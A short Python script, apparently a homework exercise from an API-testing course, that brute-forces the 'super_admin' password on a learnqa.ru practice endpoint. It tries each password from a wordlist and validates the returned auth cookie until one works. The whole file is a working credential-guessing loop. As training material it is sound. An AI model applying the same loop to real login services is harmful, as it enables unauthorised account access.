import requests

login = "super_admin"
passwords_file = "passwords.txt"

with open(passwords_file) as file:
    passwords = [line.strip() for line in file]

for password in passwords:

    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": login, "password": password})

    auth_cookie = response1.cookies.get("auth_cookie")
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": auth_cookie})

    if response2.text == "You are authorized":
        print(f"Password is {password}")
        break